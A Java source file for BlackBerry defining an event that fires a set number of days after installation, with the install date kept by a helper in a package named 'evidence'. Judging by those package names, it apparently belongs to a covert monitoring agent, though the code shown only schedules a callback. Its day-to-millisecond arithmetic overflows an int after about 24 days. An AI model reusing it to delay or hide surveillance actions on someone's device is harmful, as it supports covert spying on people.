package blackberry.event;

import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.evidence.Markup;


public class EventAfterinst extends Event {

	private int days;
	private Date date;

	protected boolean parse(ConfEvent conf) {
		try {
			days = conf.getInt("days");
			Markup markup = new Markup(this);
			Date now = new Date();
			if (markup.isMarkup()) {
				date = (Date) markup.readDate();
			} else {
				date = now;
				markup.write(date);
			}

		} catch (ConfigurationException e) {
			return false;
		}
		return true;
	}

	protected void actualStart() {
		Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
		
		long nowMillis = calendar.getTime().getTime();		
		calendar.setTime(date);
		long instMillis = calendar.getTime().getTime();
		int daysInMillis = days * 24 * 60 * 60 * 1000;
				
		long delay = instMillis + daysInMillis - nowMillis;

		if(delay>0){
			setDelay(delay);
			setPeriod(NEVER);
		}else{
			setDelay(SOON);
		}	
	}

	protected void actualStop() {
		onExit(); // di sicurezza
	}

	protected void actualGo() {
		onEnter();
	}

}
